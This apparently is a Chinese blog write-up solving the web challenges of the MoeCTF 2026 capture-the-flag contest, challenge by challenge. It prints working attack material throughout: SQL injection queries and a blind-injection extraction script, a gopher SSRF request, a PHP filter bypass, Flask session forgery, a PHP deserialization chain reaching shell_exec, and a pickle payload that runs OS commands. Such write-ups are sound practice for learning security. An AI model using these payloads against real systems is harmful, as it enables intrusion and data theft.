---
title: Moectf2026-web全解
published: 2026-08-22
description: 比赛归档后公开
image: "./1779805624979.jpeg"
password: "e9dc5aeae6c5285719072295c757c422"
passwordHint: "比赛归档后公开"
tags: ["CTF"]
category: CTF
slug: Moectf-web
---

## Web

### 查分系统

直接搜即可

### 归途

控制台：Key1-N2ghNUkkTQ==

源码：Key2-QDBtNG9k

请求：Key3-M0szeUVuKw==

请求：Key4-ZXJUaDFzbGE=

http 请求头：Key5-ITkzdA==

post 后：Key6-ZnwxbGFA

在 `/login` 页面登录后改 cookie：

Key7-NGFAZzY5Nmc5

分别解码后即可拿到 flag（在 `/robots.txt`）

flag:moectf{d92a16a7-5988-e7b3-b643-65ed639f2464}

### 查分系统_revenge

这次对信息都进行了编码处理：

### MoeCatchTheFrogs

js 文件分析后没发现什么漏洞的地方

发现抓到青蛙后给了 cookie

直接爆破即可拿到 secret key：qwe123456

给自己签 cookie：

```plain
eyJmcm9ncyI6WzAsMSwyLDMsNCw1LDYsNyw4XX0.aoLuiA.mer3u9P-efj91tFTDnL2dmz8mRA
```

flag:moectf{F1@sk_c00k1es_w1+h_w3ak_k3y_1s_vu1n3r@bl3}

### 古籍翻阅

附件得到一堆路径，加到 ip 后发现是各本书的状态

随便访问一个后发现大概是目录穿越（直接book=...）

根目录下直接出：

```plain
moectf{re@d_the_r00t_5utr4_w1th_path_tr4v3r5@l}
```

### 河湖小盗

多久没有自己手写 sql 注入了2333

第一步尝试 `1 or 1 = 1`

直接将 5 个数据全部查出来了

接下来就是常规的 union 注入，就不解释了：

```plain
1 order by 1,2,3,4#
// 出现报错
1 union select 1,database(),version()#
// past_paper	8.0.46
1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
// flag_table,past_paper,public_subjects
1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name='flag_table'#
// flag,id
1 union select 1,2,group_concat(0x5c,flag,0x5c,id) from flag_table#
// \moectf{h3re_i5_your_7e$7_pap3r}\1

```

flag:moectf{h3re_i5_your_7e$7_pap3r}

### 熊出没

根据题目描述和提示，能判断这道题为 ssrf

使用了 http 协议都被 waf 了

改用 `gophre` 成功拿到flag：

```plain
url=gopher://127.0.0.1:54321/_GET /secret-honey HTTP/1.1  
Host: 127.0.0.1
```

flag:moectf{e69274d1-073d-c602-d2d3-1f6830a262da}

### 七狗免费小说

打开题目，点击后发现应该是文件包含：

页面直接泄露了源码：

```php
$file = $_GET['file'] ?? 'chap1.html';
if (preg_match('/http|https|\.\.|^\/|=\/|index|input|data|convert|string/i', $file)) die("咬你哦！");
include($file);
$output = ob_get_clean();
if (@preg_match('//u', $output)) { echo $output; }
else { echo base64_encode($output); }  // 输出不是合法 UTF-8 时走这里

```

发现 convert* 被禁止了，这里用一个不常见的流绕过：

```plain
php://filter/zlib.deflate/resource=flag.php
```

解码后按 **raw deflate**(无 zlib 头)解压,就还原出 flag.php 源码:

```php
<?php $flag = "moectf{d95e5639-084a-0674-f1c3-334a7d366cf0}"; echo "Flag 就在上面，只有聪明的人才能看见...";
```

flag:moectf{d95e5639-084a-0674-f1c3-334a7d366cf0}

### bblogin

题目给出了源码，很明显的一个 ssti，也没有过滤

过程：

```plain
{{7*7}}
// 确保存在 ssti
{{config}}
// 泄露了 key：972afa08cc1874d3fc1491d6047d74ac7db38122949035e2b9846df6cfe2caee
```

因为长度限制的很死先不考虑 ssti

有了私钥我们就可以进行 session 伪造了

审计一下源码：

```python
@app.route('/login', methods=['POST'])

    def login():

        username = request.form.get('username', '')

        password = request.form.get('password', '')

        if(len(username)>10 or match(".()[]_",username)):

            error_html = f'<div class="error"><p>The username cannot be too long!</p></div>'

            html = INDEX_TEMPLATE.replace('{login_error_block}', error_html)

            return render_template_string(html)

        if username == 'admin' and password == I3TheAdMin_pa3vv0rc1dswer5t6yuhgfdrt:

            session['token'] = "admin"

            return redirect(url_for('user_info_page'))

  

        error_html = f'<div class="error"><p>用户{username}登录失败</p></div>'

        html = INDEX_TEMPLATE.replace('{login_error_block}', error_html)

        return render_template_string(html)

  

    @app.route('/user')

    def get_user():

        token = session.get('token')

        if token and token == "admin":

            return jsonify(username='admin', info=Rea1f1Agg999mjytredcvbhjytredf)

        return jsonify({'error': '未登录'}), 401
```

在 `/user` 路由内，可以看到只校验 `token` 的值是不是等于 admin，若是满足则返回 `Rea1f1Agg999mjytredcvbhjytredf` 的值，这道题主要就是要知道 key 来让我们对 session 进行签名

最终伪造：

```plain
eyJ0b2tlbiI6ImFkbWluIn0.aoL6mQ.-wv4YrW6jAdGMNXusjIyoZ28bc4
```

访问 `/user` 拿到flag:moectf{47b2b084-6064-d00c-3900-0440f44c6780}

### 你会git吗？

下载得到一个 `.git` 文件

首先 `git log --all --oneline --decorate` 查看所有 commit 历史

得到：

```plain
67aad96 (HEAD -> master) where is my fl2g?
fba7a42 where is my f1ag?
70a645f where is my fl0g?
```

看第 0 个 `git show 70a645f`，再去看 git 暂存区：

```plain
git ls-files --stage
// flag.txt
git show :flag.txt
// flag is me,use base64 and put in moectf{}:ZzE3XzE1X3NvXzNhU3k=
```

flag:moectf{g17_15_so_3aSy}

### 七狗收费小说

扫，看到一堆 `.git` 文件：

```plain
[19:12:17] 200 -   24B  - /.git/COMMIT_EDITMSG
[19:12:17] 200 -   92B  - /.git/config
[19:12:19] 200 -  177B  - /.git/logs/HEAD
[19:12:24] 200 -   73B  - /.git/description
[19:12:24] 200 -   23B  - /.git/HEAD
[19:12:26] 200 -  137B  - /.git/index
```

使用 `git-dumper` 拿到文件后看 `index.php`：

```php
<?php

// 小刻可是学了最新的 PHP 8 哦，快夸夸小刻

error_reporting(0);

  

class User

{

    public $username, $password;

    public $secret_a, $secret_b;

  

    public function __construct($username, $password)

    {

        $this->username = $username;

        $this->password = $password;

        $this->secret_a = $this->secret_b = 0;

    }

  

    public function __wakeup()

    {

        // 每次都要重新登录，这样坏人肯定进不来啦

        $this->secret_b = random_int(1000_0000, 9999_9999);

    }

  

    public function __destruct()

    {

        if ($this->username !== $this->password)

            die("不对，密码不对！");

        if ($this->secret_a !== $this->secret_b)

            die("不行，要重新登录！");

  

        echo "已经登录啦：$this->username";

    }

}

  

class UserInfo

{

    public $user, $permission;

  

    public function __construct($user)

    {

        $this->user = $user;

        $this->permission = $user->username === "admin" ? "权限 7" : "权限 0";

    }

  

    public function __tostring()

    {

        return $this->user->username . "（权限等级：" . $this->permission . "）";

    }

}

  

class Diagnosis

{

    public $key, $value, $action;

  

    public function __get($name)

    {

        if ($name === $this->key && is_object($this->action)) {

            return ($this->action)($this->value);

        }

        return null;

    }

  

    public function __invoke($value)

    {

        return shell_exec("$this->key$value");

    }

}

  

$curr_user = null;

  

if (isset($_POST['username']) && isset($_POST['password'])) {

    $username = $_POST['username'];

    $password = $_POST['password'];

  

    $user = new User($username, $password);

  

    $data = base64_encode(serialize($user));

    setcookie('user', $data, time() + 3600, '/');

    $curr_user = $user;

  

} elseif (isset($_COOKIE['user'])) {

    $data = base64_decode($_COOKIE['user']);

    $curr_user = unserialize($data);

}

?>

  

<!DOCTYPE html>

<html lang="zh-CN">

  

<head>

    <meta charset="UTF-8">

    <title>刻俄柏的小说</title>

</head>

  

<body>

    <div style="width: 100%; background: #ffda33;">

        <h2 style="color: #2b2923;">刻俄柏的小说（登录才能看！）</h2>

    </div>

  

    <form method="POST" action="">

        <label for="username">用户名</label><br>

        <input type="text" id="username" name="username" required><br><br>

  

        <label for="password">密码</label><br>

        <input type="password" id="password" name="password" required><br><br>

  

        <input type="submit" value="登录">

    </form>

</body>

  

</html>
```

很明显的反序列化

这里分析下：

```php
User::__destruct()
    ↓
echo "已经登录啦：$this->username"
    ↓
UserInfo::__toString()
    ↓
$this->user->username
    ↓
Diagnosis::__get("username")
    ↓
($this->action)($this->value)
    ↓
Diagnosis::__invoke()
    ↓
shell_exec("$this->key$value")
```

分析 pop 链不难得到上述结果，都是一步一步触发魔术方法的

从开头开始分析，这里我们要让 `username` 等于 `password`，`secret_a` 等于 `secret_b`

都是严格比较

这里先看第一个，对象的严格比较判断是否都指向一个对象实例

这里让他们都指向同一对象实例即可：

```php
$info = new UserInfo();
$user = new User(); 
$user->username = $info;
$user->password = $user->username
```

这里都让他们指向了 `$info` 这个对象实例

第二个是 secret，这里由于 `__wakeup` 魔术方法的自动触发，会随机为 `secret_b` 进行赋值，我们这里使用引用绕过：

```php
$user->secret_a = 123456;
$user->secret_b =& $user->secret_a;
```

这个引用使得，在改变一个变量的值的时候，另一个构建了引用的变量的值也会同时发生更改

echo 出来，构建对象实例 `UserInfo`，触发魔术方法

后面的链子有 `$this->user->username`

最后一步：

```php
$diag2 = new Diagnosis();

$diag2->key = "ls";
$diag2->value = "";
$diag2->action = null;
```

diag1：

```php
$diag1 = new Diagnosis();

$diag1->key = "username";
$diag1->value = "";
$diag1->action = $diag2;
```

整体逻辑：

```plain
UserInfo::__toString()
          │
          ▼
$this->user->username
          │
          ▼
$diag1->username
          │
          ▼
Diagnosis #1::__get("username")
          │
          ▼
$diag2("")
          │
          ▼
Diagnosis #2::__invoke("")
          │
          ▼
shell_exec("ls")
```

从 tostring 到 username 这里先让 user 指向 `$diag1`，达到触发 `__get`，（这里的 `$diag1` 的 `$action` 指向了 `$diag2`）随后通过校验后执行 `$diag2('')` 触发 `__invoke`，最后在 `$diag2` 里面拼接命令即可

exp：

```php
<?php

class User
{
    public $username, $password;
    public $secret_a, $secret_b;
}

class UserInfo
{
    public $user, $permission;
}

class Diagnosis
{
    public $key, $value, $action;
}


// 第二个 Diagnosis：真正执行命令
$diag2 = new Diagnosis();
$diag2->key = "ls";
$diag2->value = "";
$diag2->action = null;


// 第一个 Diagnosis：通过 __get 把流程传给 diag2
$diag1 = new Diagnosis();
$diag1->key = "username";
$diag1->value = "";
$diag1->action = $diag2;


// UserInfo：触发 diag1->username
$info = new UserInfo();
$info->user = $diag1;
$info->permission = "权限 0";


// User
$user = new User();

// username / password 指向同一个 UserInfo
$user->username = $info;
$user->password = $user->username;


// secret_a / secret_b 建立引用
$user->secret_a = 123456;
$user->secret_b =& $user->secret_a;


// 最终 Cookie
$payload = base64_encode(serialize($user));

echo $payload . PHP_EOL;
echo PHP_EOL;
echo "Cookie:" . PHP_EOL;
echo "user=" . $payload . PHP_EOL;
```

flag:moectf{34b2b61b-55a0-9e5c-8f2f-5fb688f061dc}

### 黑市走私

根据提示说明是 http 走私

这里访问 `/hint` 路由，得到了 jwt 和一些可能的密钥，后续尝试出 `fish` 为 key

随后签名：

```plain
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cmF2ZWxlciIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoiZmxhZ3MifQ.EQmuoZNLf5aUF-WJ1MdjUFZJgPilOkgJRjXawdvIooI
```

得到提示后很明显，`/flag1` 的是 cl.te，直接构造 http 走私即可

`/flag2` 的是 te.te，这道题还不用尝试多种混淆，直接就提示了加空格即可

flag:moectf{Y0u_have_m4r3d_http_5mu6g1!n6}

### 日志系统

看源码明显是个 pickle 反序列化：

```python
class LogEntry:

    """

    小D觉得用自定义对象比字典更有面向对象的感觉，

    并且导出/导入时直接用 pickle 序列化整个列表，方便又强大！

    """
    
    
    
@app.route("/import", methods=["POST"])

def import_logs():

    """

    小D为了兼容各种数据，直接对上传内容执行反序列化，

    还能把还原出来的对象直接展示出来，方便预览。

    """

    f = request.files.get("file")

    if not f or not f.filename:

        return redirect("/?err=请选择要导入的文件")

    data = f.read()

    if not data:

        return redirect("/?err=文件内容为空")

    try:

        obj = pickle.loads(data)

    except Exception as e:

        return redirect("/?err=反序列化失败：" + str(e)[:200])
```

这里可以看到，在 `/import` 路由处，直接将我们输入的数据进行反序列化而没有任何过滤 `obj = pickle.loads(data)`

```python
	except Exception as e:
        return redirect("/?err=反序列化失败：" + str(e)[:200])
```

如果反序列化失败，还会将报错信息抛出

看看如何回显：

```python
    preview = str(obj).replace("\n", " ").replace("\r", " ").strip()[:200]
    return redirect("/?msg=" + quote("导入预览结果：" + preview))
```

这里先将我们的信息处理下随后直接拼接到 `msg` 参数中并且直接重定向到 flag 页面，回显没问题

最终 payload：

```python
import pickle
import sys

class Payload:
    def __reduce__(self):
        expr = "__import__('os').popen('ls /').read()"
        return (eval, (expr,))
```

### 江洋大盗

依旧 sql 注入，给了黑名单：

```plain
BLACKLIST = [
    "union",
    "sleep",
    "benchmark",
    "get_lock",
    "release_lock",
    "extractvalue",
    "updatexml",
    "load_file",
    "outfile",
    "dumpfile",
    " into ",
    "insert",
    "update",
    "delete",
    "drop",
    "alter",
    "create",
    "replace",
    "truncate",
    "handler",
    "procedure",
    "--",
    "/*",
    "*/",
    "#",
    ";",
]
```

测试发现为数字型，布尔注入发现可以

尝试使用布尔盲注得到flag：

```python
# -*- coding: utf-8 -*-

"""网信院往年试题检索系统 - MySQL 布尔盲注提取脚本"""

import requests, sys, time

  

URL = "http://127.0.0.1:41836/"

HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}

  

def oracle(cond: str) -> bool:

    """数字型布尔盲注 oracle: id=1 and (cond)"""

    payload = f"1 and ({cond})"

    try:

        r = requests.post(URL, data={"id": payload}, headers=HEADERS, timeout=10)

        return "result-table" in r.text

    except Exception as e:

        print("[!] request error:", e)

        return False

  

def get_char(expr: str, pos: int) -> int:

    """提取 expr 第 pos 个字符的 ascii 值（二分）"""

    lo, hi = 0, 255

    sub = f"ord(substr(({expr}),{pos},1))"

    while lo < hi:

        mid = (lo + hi) // 2

        if oracle(f"{sub}>{mid}"):

            lo = mid + 1

        else:

            hi = mid

    return lo

  

def get_str(expr: str, max_len=60, verbose=True) -> str:

    out = ""

    for i in range(1, max_len + 1):

        c = get_char(expr, i)

        if c == 0:

            break

        out += chr(c)

        if verbose:

            sys.stdout.write(chr(c)); sys.stdout.flush()

    return out

  

if __name__ == "__main__":

    mode = sys.argv[1] if len(sys.argv) > 1 else "database"

    if mode == "database":

        print("[*] database(): ", end="", flush=True)

        print(get_str("select database()"))

    elif mode == "tables":

        print("[*] tables: ", end="", flush=True)

        print(get_str("select group_concat(table_name) from information_schema.tables where table_schema=database()"))

    elif mode == "columns":

        t = sys.argv[2]

        print(f"[*] columns of {t}: ", end="", flush=True)

        print(get_str(f"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{t}'"))

    elif mode == "dump":

        t, cols = sys.argv[2], sys.argv[3]

        print(f"[*] dump {t}({cols}): ", end="", flush=True)

        print(get_str(f"select group_concat({cols}) from {t}"))
```

盲注刚好还有回显，响应不一样直接盲注

flag:`moectf{C0ngr@+u1@7|0ns_8u+_+h3re_wou1d_not_6e_any_pas7_3x@m_pap3r_in_f4ct}`
